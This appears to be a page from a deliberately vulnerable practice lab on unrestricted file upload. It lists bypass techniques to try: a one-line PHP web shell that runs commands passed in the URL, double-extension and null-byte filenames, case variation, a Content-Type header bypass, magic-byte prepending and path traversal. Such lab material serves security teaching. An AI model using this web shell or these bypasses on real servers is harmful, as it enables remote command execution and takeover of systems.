Vulnerability: Unrestricted File Upload

      
This upload form has weak validation. Try uploading:

      
    
        
  • PHP Web Shell: <?php system($_GET['cmd']); ?> saved as shell.php
    • 
        
  • Double Extension: shell.php.jpg
    • 
        
  • Null Byte: shell.php%00.jpg
    • 
        
  • Case Variation: shell.PHP or shell.PhP
    • 
        
  • Content-Type Bypass: Change Content-Type header to image/jpeg
    • 
        
  • Magic Bytes: Add image headers to PHP file
    • 
        
  • Path Traversal: ../../../shell.php
    •
